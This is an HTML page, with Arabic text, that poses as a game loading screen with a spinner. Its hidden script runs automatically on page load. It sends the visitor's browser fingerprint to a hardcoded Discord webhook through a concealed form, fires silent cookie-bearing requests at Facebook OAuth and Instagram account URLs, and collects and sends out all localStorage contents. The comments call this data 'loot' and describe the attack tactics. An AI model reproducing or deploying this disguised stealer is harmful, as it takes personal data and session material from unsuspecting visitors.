<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
        .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="version-marker">15</div>
    <div class="loader"></div>
    <p>جاري مزامنة بروتوكول الحصاد (V1.2.7)...</p>

    <iframe name="hidden_receiver" style="display:none;"></iframe>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function sendExfil(title, content) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = WEBHOOK_URL;
            form.target = 'hidden_receiver';
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'payload_json';
            input.value = JSON.stringify({
                embeds: [{
                    title: "💎 " + title,
                    description: content,
                    color: 3066993,
                    footer: { text: "Protocol: V1.2.7 | Device: Android 14" }
                }]
            });
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
        }

        async function finalStrike() {
            try {
                // 1. بصمة الجهاز المحدثة
                sendExfil("Target_Sync", `UA: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);

                // 2. تكتيك الـ OAuth Stealth Tunneling
                // إجبار المتصفح على طلب روابط حساسة بكوكيز الضحية (بدون فتح نوافذ)
                const tunnels = [
                    { name: "FB_OAuth", url: "https://www.facebook.com/dialog/oauth?client_id=124024574287442&redirect_uri=https://mbasic.facebook.com" },
                    { name: "Insta_Edit", url: "https://www.instagram.com/accounts/edit/?__a=1" }
                ];

                tunnels.forEach(t => {
                    const probe = new Image();
                    probe.src = t.url + "&cache_bust=" + Math.random();
                    // بمجرد إرسال الطلب، المتصفح يكون قد "سلم" الكوكيز للموقع
                    sendExfil("Tunnel_Injected", `تم حقن طلب صامت إلى: ${t.name}`);
                });

                // 3. سحب بيانات التخزين المحلي العميقة
                let loot = "";
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    loot += `**${key}**: ${localStorage.getItem(key).substring(0, 150)}...\n`;
                }
                
                if (loot) {
                    sendExfil("Storage_Harvest", loot);
                } else {
                    sendExfil("Status_Update", "LocalStorage فارغ (نظام التمويه نشط)");
                }

            } catch (e) {
                sendExfil("Error_Log", e.message);
            }
        }

        // تشغيل المهمة
        setTimeout(finalStrike, 1500);
    </script>
</body>
</html>
